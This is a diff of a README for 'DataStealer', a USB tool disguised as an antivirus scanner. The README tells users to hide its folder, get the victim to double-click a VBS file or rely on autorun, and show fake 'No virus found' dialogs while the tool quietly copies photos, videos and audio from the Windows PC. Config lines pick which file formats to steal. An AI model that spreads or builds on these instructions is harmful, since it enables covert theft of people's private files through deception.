@@ -4,10 +4,10 @@
 [Releases](https://github.com/Kevinsillo/datastealer/releases)
 
 ## Information
-DataStealer is a simple funcionality for USB device (fake Antivirus USB) to gather information in Windows systems.
+DataStealer is a simple funcionality for USB device (fake Antivirus USB) to gather user information in Windows systems.
 
 ## Intructions
-Just copy all from DataStealer folder and paste in USB device. Hide **"data"** folder and **"run.bat"**. When you conect USB device in Windows system just doble click in AntivirusUSB.vbs and DataStealer copy all files stealthily from pc.
+Just copy all from DataStealer folder and paste in USB device. Hide **"data"** folder. When you conect USB device in Windows system just doble click in AntivirusUSB.vbs and DataStealer copy all files stealthily from pc.
 
 ***NOTE: You can use autotun.inf for auto-execute .vbs file but it only works in Windows Vista and Windows XP.***
 
@@ -17,19 +17,19 @@ Just copy all from DataStealer folder and paste in USB device. Hide **"data"** f
 >Open=AntivirusUSB.vbs
 
 ## Configuration
-You can change diferents values in **run.bat**.
+You can change diferents values in **data\run.bat** and **AntivirusUSB.vbs**.
+
+## AntivirusUSB.vbs
+
+**Change messages** 
+>x=msgbox("Analyzing USB device for searching virus." ,64, "Antivirus USB - Info") [WINDOWS TEXT]
+>
+>x=msgbox("No virus found." ,64, "Antivirus USB - Info") [WINDOWS TEXT]
+
+## data\run.bat
 
 **Add or remove formats of steal files**
 >set formats=*.jpg *.png *.mp4 *.3gp *.wav
-
-**Enable or disable messages**
->set msg1=**true / false** [DEFAULT TRUE]
->
->set msg2=**true / false** [DEFAULT TRUE]
->
->set msg1text=Analyzing USB device for searching virus. [WINDOWS TEXT]
->
->set msg2text=No virus found. [WINDOWS TEXT]
 
 **Enable or disable file theft and sizes (kilobyte)**
 >set stealfiles=**true / false** [DEFAULT TRUE]
